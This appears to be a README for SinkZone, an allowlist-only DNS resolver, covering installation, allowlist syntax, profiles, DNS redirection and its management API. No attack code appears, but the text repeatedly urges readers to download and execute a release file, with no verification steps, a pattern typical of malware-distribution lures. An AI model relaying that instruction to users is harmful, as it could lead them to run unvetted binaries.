# SinkZone — Allowlist-Only DNS for Focused, Safe Browsing Control 🚦🔒

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=for-the-badge)](https://github.com/TheLawIsExplicit/sinkzone/releases)

![SinkZone hero](https://images.unsplash.com/photo-1509395176047-4a66953fd231?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=2a2c38b8897a3d3f9b2c9a6b9d5f8f31)

Project: DNS allowlist. Block everything. Allow only what matters. Focus. Productivity. Child safety.

Badges
- Build: none
- License: MIT
- Release: [Download releases](https://github.com/TheLawIsExplicit/sinkzone/releases)

Download and run the release file from the Releases page. You must download the release asset and execute it to install SinkZone. See the Releases link above and below for the release file to download and execute.

---

Table of contents
- What SinkZone does
- Key benefits
- How it works
- Architecture
- Quick start
  - Downloads and releases
  - Run the release file
- Installation
  - Linux
  - macOS
  - Windows
  - Docker
  - Raspberry Pi / Home router
- Configuration
  - Allowlist format
  - DNS rules
  - Local exceptions
  - Time-based profiles
- Common workflows
  - Productivity mode
  - Kid-safe mode
  - Meeting mode
  - Kiosk mode
- Advanced topics
  - Upstream resolution
  - DNS over TLS / DNS over HTTPS
  - Caching and TTL
  - Logs and metrics
  - Health checks
- Network setup
  - Home network
  - Office network
  - Remote workers
- Testing and validation
- Troubleshooting
- Security
- Contributing
- Roadmap
- FAQ
- License
- Changelog / Releases

What SinkZone does
- SinkZone blocks DNS queries by default.
- It only resolves names on an allowlist.
- It rejects or sinks all other names.
- It gives you predictable internet access.
- It limits distractions.
- It gives parents control.

Key benefits
- Focus. Block social feeds, apps, and trackers.
- Safety. Prevent access to adult content and unsafe sites.
- Productivity. Keep only work-related domains.
- Simplicity. One list controls access.
- Flexibility. Per-device or per-network rules.
- Auditability. Logs show allowed and blocked queries.

How it works
SinkZone acts as a DNS server. You point clients to it as the resolver. It accepts queries. It checks each name against an allowlist. If the name matches the allowlist, SinkZone resolves the name via an upstream resolver. If not, SinkZone returns a sink response. Sink responses can be NXDOMAIN or an IP such as 0.0.0.0. You choose the sink behavior.

Key concepts
- Allowlist: the single source of truth for allowed names.
- Sink response: the reply for blocked names.
- Upstream resolver: the DNS server SinkZone uses for allowed names.
- Profiles: sets of allowlist entries for different contexts.
- Devices: clients that use SinkZone.

Architecture
- Frontend DNS server:
  - UDP and TCP on port 53.
  - Optional DoT or DoH endpoints.
- Allowlist engine:
  - Fast path match for exact names.
  - Wildcard and suffix match for domains.
  - Regex support for advanced rules.
- Policy engine:
  - Per-IP, per-subnet, per-profile rules.
  - Time window rules.
- Upstream connector:
  - Supports multiple upstreams.
  - Failover and parallel queries.
- Cache:
  - In-memory cache with TTL respect.
  - Optional persistent cache.
- Logging:
  - Structured logs (JSON).
  - Query logs and decision logs.
- Management API:
  - Local HTTP API for config and stats.
  - Authentication support.

Quick start

Download releases
- Visit the Releases page and download the release file.
- Use this link: https://github.com/TheLawIsExplicit/sinkzone/releases
- Download the asset named sinkzone-{version}-{os}.{ext}.
- The release file needs to be downloaded and executed.
- The release asset may be a binary, tarball, or installer.
- Execute the file to install SinkZone.

Run the release file (example)
- Linux tarball:
  - Download sinkzone-1.2.3-linux-amd64.tar.gz
  - Extract: tar xzf sinkzone-1.2.3-linux-amd64.tar.gz
  - Run: sudo ./sinkzone install
- Linux binary:
  - Download sinkzone-1.2.3-linux-amd64
  - Make executable: chmod +x sinkzone-1.2.3-linux-amd64
  - Run: sudo ./sinkzone --config /etc/sinkzone/config.yaml
- Windows installer:
  - Download sinkzone-1.2.3-windows.exe
  - Run the installer and follow the prompts.
- Docker:
  - Pull image tagged with the release version from releases or Docker Hub.
  - Start container with config volume.

Installation

Linux (systemd)
- Place the binary in /usr/local/bin or /opt/sinkzone.
- Create /etc/sinkzone/config.yaml
- Example unit file:
  ```ini
  [Unit]
  Description=SinkZone DNS server
  After=network.target

  [Service]
  User=root
  ExecStart=/usr/local/bin/sinkzone --config /etc/sinkzone/config.yaml
  Restart=on-failure
  LimitNOFILE=65536

  [Install]
  WantedBy=multi-user.target
  ```
- Enable and start:
  - sudo systemctl daemon-reload
  - sudo systemctl enable sinkzone
  - sudo systemctl start sinkzone

macOS (launchd)
- Use a plist to run the binary at boot.
- Place the binary in /usr/local/bin.
- Use launchctl to load the plist.

Windows
- Use the installer from the Releases page.
- The installer registers SinkZone as a service.
- Use the management UI or CLI to configure.

Docker
- Example docker run:
  ```bash
  docker run -d \
    --name sinkzone \
    --restart unless-stopped \
    -p 53:53/udp -p 53:53/tcp \
    -v /opt/sinkzone/config.yaml:/etc/sinkzone/config.yaml:ro \
    sinkzone/sinkzone:1.2.3
  ```
- Map config and logs to host volumes.

Raspberry Pi / Home router
- Use the ARM release or build from source.
- Run on the Pi and set your router DHCP to point clients to the Pi IP.
- For OpenWrt, run SinkZone inside a container or on a separate host.

Configuration

Primary config file (YAML)
- server:
  - listen: 0.0.0.0:53
  - doh: 127.0.0.1:443
  - timeout: 2s
- sink:
  - type: nx
  - ip: 0.0.0.0
- upstream:
  - - 1.1.1.1
  - - 8.8.8.8
- profiles:
  - default: /etc/sinkzone/allowlists/default.txt
  - kids: /etc/sinkzone/allowlists/kids.txt
- logging:
  - level: info
  - format: json

Allowlist format
- One entry per line.
- Support exact host names:
  - example.com
  - api.example.com
- Support domain suffix:
  - .work.example
  - .trusted
- Support wildcard:
  - *.team.example
- Support regex (enable in config):
  - /regex-pattern/
- Comments start with #
- Blank lines are ignored

Allowlist examples
- Work profile:
  - docs.google.com
  - slack.com
  - api.company.com
  - .companycdn.com
- Kids profile:
  - kids.example.com
  - *.edu
  - content-filtered-video.example
- Kiosk profile:
  - company-portal.example
  - payment.example.com

DNS rules
- Exact match wins.
- Longest suffix match wins for domain suffixes.
- Wildcards match subdomains.
- Regex runs last if enabled.
- You can set per-profile TTL override.

Local exceptions
- Use an exceptions file for internal names.
  - internal.corp
  - printer.local
- Add private IP mappings for local hostnames:
  - host1.internal 10.0.0.5

Time-based profiles
- Define profiles with active windows.
- Example:
  - kids: 07:00-20:00
  - focus: 09:00-17:00
- SinkZone switches profiles for clients by IP or MAC.

Common workflows

Productivity mode
- Purpose: reduce distractions during work hours.
- Setup:
  - Create a profile named work.
  - Add company domains and commonly used tools.
  - Block social and entertainment domains.
  - Set start and end times for the profile.
- Apply:
  - Map work profile to work subnet or workstation IPs.

Kid-safe mode
- Purpose: protect children from harmful content.
- Setup:
  - Create kids profile with safe domains.
  - Add educational sites and streaming services you trust.
  - Block known adult and gambling domains.
- Apply:
  - Use DHCP to assign kids profile by client MAC.

Meeting mode
- Purpose: stop notifications and limit bandwidth use.
- Setup:
  - Create meeting profile.
  - Allow video conferencing services and company sites.
  - Block social and media sites.
- Apply:
  - Trigger profile by calendar integration or manual toggle.

Kiosk mode
- Purpose: lock a device to a fixed set of pages.
- Setup:
  - Strict allowlist with only the required domains.
  - Set sink type to a local info page or captive portal.
- Apply:
  - Use profile assigned to kiosk IP or VLAN.

Advanced topics

Upstream resolution
- SinkZone supports multiple upstreams.
- Use parallel queries for speed.
- Use failover when an upstream fails.
- Use specific upstream per domain if you trust an upstream for a namespace.

DNS over TLS / DNS over HTTPS
- SinkZone can send allowed queries to DoT or DoH endpoints.
- Configure certificate validation.
- Use DoH for networks that block port 53.

Caching and TTL
- SinkZone respects the TTL from upstream.
- Configure minimum and maximum cache TTL.
- Use persistent cache to survive restarts.

Logs and metrics
- Query logs show:
  - timestamp, client IP, queried name, decision, upstream
- Decision logs show why a name passed or failed.
- Metrics:
  - queries per second
  - hit ratio
  - blocked count
- Export metrics to Prometheus.

Health checks
- Expose an HTTP health endpoint.
- Provide metrics for uptime and cache stats.
- Use the endpoint in service monitors.

Network setup

Home network
- Run SinkZone on a Pi or NAS.
- Set your router DHCP to hand out SinkZone as DNS.
- For devices that use hardcoded DNS, use firewall rules to redirect DNS to SinkZone.

Office network
- Run SinkZone on a dedicated server or container.
- Point DHCP to SinkZone.
- Use VLANs to separate guest and staff traffic.
- Apply different profiles per VLAN.

Remote workers
- Use a VPN to route remote DNS to SinkZone.
- Alternatively, offer a DoH endpoint for remote clients.
- Enforce client auth for DoH.

Testing and validation

Basic tests
- dig @sinkzone-ip example.com
- dig @sinkzone-ip socialsite.example
- Expected: allowed names return A/AAAA. Blocked names return NXDOMAIN or sink IP.

Profile tests
- Test with client IP bound to a profile.
- Test time-based activation by changing system time or schedule.

Edge cases
- Catch captive portals that intercept DNS.
- Handle DNSSEC validation if required by your upstream.

Troubleshooting

Common issues
- Clients still use other DNS:
  - Check DHCP settings.
  - Check firewall rules.
- SinkZone not binding to port 53:
  - Check permission or port conflict.
  - Stop other DNS services.
- Upstream failure:
  - Check network and upstream IPs.
  - Check DoT/DoH certificates.

Debugging tips
- Use tcpdump to capture DNS packets.
- Use dig for manual queries.
- Check logs at /var/log/sinkzone or journalctl.

Security

Best practices
- Run SinkZone on a minimal host.
- Update SinkZone via the releases page.
- Use least privilege for the service user.
- Restrict access to the management API.
- Use TLS for DoH and DoT.

Data handling
- Logs contain DNS queries.
- Retain logs only as long as needed.
- Use log rotation and secure log storage.

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Open a pull request with tests.
- Follow the code style and run linting.

Code of conduct
- Be respectful and clear.
- Submit issues with reproducible steps.

Testing
- Unit tests for allowlist matching.
- Integration tests for DNS behavior.
- End-to-end tests with containers.

Roadmap
- Per-user profiles via auth.
- GUI for allowlist management.
- Mobile app for toggles.
- Synced allowlists across devices.
- Policy templates for schools and offices.

FAQ

Q: What DNS reply does SinkZone return for blocked names?
A: You choose. SinkZone supports NXDOMAIN or an IP sink. Use NXDOMAIN to break resolution. Use a sink IP to route blocked requests to a local info page.

Q: Can SinkZone allow subdomains?
A: Yes. Use wildcard or suffix entries. Example: .trusted allows any subdomain of trusted.

Q: Can I run SinkZone and another DNS server side by side?
A: You must avoid port conflicts. Use different ports or run on separate hosts. For production, run SinkZone as the primary resolver.

Q: How do I allow a new site during the day?
A: Add it to the active profile allowlist. SinkZone reloads the list without restart. You can push changes via API.

Q: How does SinkZone handle CDN domains that serve both allowed and blocked content?
A: Use exact hostnames for specific services. Use path or SNI based rules in upstream proxies if needed.

Changelog and Releases
- All release builds and assets appear on the Releases page.
- Download the release asset and execute it to install or upgrade.
- Example release asset name: sinkzone-1.2.3-linux-amd64.tar.gz
- Visit the Releases page here: https://github.com/TheLawIsExplicit/sinkzone/releases

Integration examples

NGINX captive page for sink IP
- Configure an NGINX server on the sink IP to show an info page for blocked requests.
  ```nginx
  server {
    listen 80;
    server_name _;
    root /var/www/sinkzone;
    location / {
      try_files $uri $uri/ =404;
    }
  }
  ```

DHCP configuration (ISC dhcpd)
- Example:
  ```
  option domain-name-servers 192.168.1.10;
  ```

iptables redirect for forced DNS
- Redirect UDP/TCP 53 to SinkZone IP:
  ```bash
  iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.10:53
  iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.10:53
  ```

Monitoring with Prometheus
- Expose metrics on /metrics.
- Scrape endpoint with Prometheus.

Sample allowlist templates

Work (default)
- docs.google.com
- drive.google.com
- mail.google.com
- *.company.com
- slack.com
- teams.microsoft.com
- github.com
- api.company.com

Kids
- kids.learn.example
- kids.videos.example
- *.edu
- apps.kids.example

Kiosk
- company-portal.example
- helpdesk.example

Management API (example)

Get status
- GET /api/v1/status
- Returns: running, uptime, queries, blocked_count

Update allowlist
- POST /api/v1/allowlists/{profile}
- Body: plain text list

Reload config
- POST /api/v1/reload

Auth
- Token-based auth in headers.

Logging examples

JSON log line
- {"ts":"2025-01-01T10:00:00Z","client":"192.168.1.50","name":"facebook.com","decision":"block","rule":"default-no-social","upstream":"","rtt":0}

Metrics to track
- sinkzone_queries_total
- sinkzone_blocked_total
- sinkzone_allowed_total
- sinkzone_cache_hits_total
- sinkzone_cache_misses_total

Testing commands

Query allowed name
- dig @127.0.0.1 docs.google.com +short

Query blocked name
- dig @127.0.0.1 social.example +short
- Expect NXDOMAIN or no A record.

Client-side scripts

Bulk allowlist update (bash)
- Example to push a new allowlist:
  ```bash
  curl -X POST -H "Authorization: Bearer $TOKEN" \
    --data-binary @allowlist.txt \
    http://127.0.0.1:8080/api/v1/allowlists/work
  ```

Audit tools

Generate a report of blocked queries per client
- Use logs to compute top blocked hostnames.
- Export to CSV for review.

Privacy and data
- SinkZone logs DNS queries.
- Mask or anonymize client IPs if needed.
- Store logs on systems you control.

Scaling tips
- Use multiple SinkZone instances behind a load balancer.
- Use shared cache or consistent hashing for cache pinning.
- For high QPS, use a compiled binary on a server with large NIC buffers.

Testing at scale
- Use dnsperf or queryperf to simulate load.
- Monitor latency and cache hit ratio.

Backup and restore
- Backup allowlist files.
- Backup config.yaml and certs.
- Use snapshot and restore for persistent cache if enabled.

Maintenance
- Check for updates on the Releases page.
- Rotate any keys and certificates.
- Test upgrades in a staging environment.

Legal and policy
- Use allowlists consistent with local laws and policy.
- Define acceptable use policies for networks you manage.

Credits
- Core team: list contributors in CONTRIBUTORS.md
- Design: list designers
- Community: the users who test and report issues

Files and folders (typical layout)
- /usr/local/bin/sinkzone
- /etc/sinkzone/config.yaml
- /etc/sinkzone/allowlists/
  - default.txt
  - kids.txt
  - kiosk.txt
- /var/log/sinkzone/
- /opt/sinkzone/cache/

Examples of config snippets

Allowlist entry with comment
```
# Work domains
docs.google.com
drive.google.com
```

Regex entry (if enabled)
```
/^ads[0-9]*\./
```

Profile mapping by subnet
```
profiles:
  192.168.1.0/24: work
  192.168.2.0/24: kids
```

Automation ideas
- Sync allowlists from a Git repo.
- Use CI to validate list changes.
- Use webhooks to reload SinkZone on changes.

UX and controls
- UI: manage profiles, search allowlist, toggle profiles.
- CLI: status, reload, push allowlist.

Testing checklist before deployment
- Confirm binary runs on your OS.
- Confirm DNS binding on port 53.
- Test queries for allowed and blocked names.
- Verify DHCP points to SinkZone.
- Test DoH/DoT if used.
- Validate log generation.

Release and upgrade procedure
- Download new release asset from Releases.
- Stop service.
- Replace binary or run installer.
- Run config validator if provided.
- Start service and verify.

Releases again
- The release file must be downloaded and executed from the Releases page. Find the release asset for your OS and architecture at:
  https://github.com/TheLawIsExplicit/sinkzone/releases
- Run the downloaded file to install or upgrade SinkZone.

Example deployment scenarios

Single user on laptop
- Install SinkZone locally.
- Configure local resolver to 127.0.0.1.
- Use allowlists for focus.

Family home
- Run SinkZone on Pi.
- Use DHCP to point all devices.
- Create kid and guest profiles.

Small office
- Run SinkZone in a VM or container.
- Integrate with DHCP and AD for device mapping.

School network
- Use strict allowlists for student devices.
- Provide teacher profile with wider access.

Enterprise
- Use SinkZone as an internal resolver for managed devices.
- Integrate with SSO for per-user profiles.

Commands reference

Start service
- systemctl start sinkzone

Stop service
- systemctl stop sinkzone

Reload config
- systemctl reload-or-restart sinkzone

View logs
- journalctl -u sinkzone -f

API endpoints
- GET /api/v1/status
- POST /api/v1/allowlists/{profile}
- POST /api/v1/reload
- GET /metrics

Security checklist
- Run services under non-root user if possible.
- Limit access to management API.
- Use TLS for DoH and DoT.
- Keep system packages up to date.

Example: allowlist automation pipeline
- Author creates a pull request in Git repo with new domains.
- CI validates format and runs tests.
- On merge, CI pushes allowlist to SinkZone via API.
- SinkZone reloads list and logs the change.

Maintenance tasks
- Rotate API tokens.
- Purge old logs.
- Check cache health.
- Review blocked query reports.

Commands to inspect cache
- sinkzone cache stats
- sinkzone cache dump --limit 100

Helpful tips
- Use short lists for strict control.
- Use profiles to avoid frequent edits.
- Keep an emergency bypass for admin access.

Frequently used files
- config.yaml
- allowlists/default.txt
- allowlists/kids.txt
- service unit file

Community and support
- File issues in the repo.
- Open pull requests for fixes and features.
- Share allowlist templates.

License
- MIT. See LICENSE file.

Acknowledgments
- Open source DNS libraries and projects
- Community testers and contributors

Changelog pointer
- Check the Releases page for full changelog and assets.
- Download the release file and execute it for installation and upgrades: https://github.com/TheLawIsExplicit/sinkzone/releases

Screenshots and visual aids

Allowlist editor UI (mock)
![Allowlist editor](https://images.unsplash.com/photo-1508830524289-0adcbe822b40?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=9b0a3f6d3a7f76d3e0a7f1f2a440d7f1)

Network diagram
![Network diagram](https://images.unsplash.com/photo-1504384308090-c894fdcc538d?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=6c8f5d2b8f0b2e7a9e3b8e3d6f7c9f6b)

Contact
- Open an issue on GitHub for bugs and feature requests.
- Send pull requests for code changes.
- For enterprise support, check the issues and README in repo.

End of file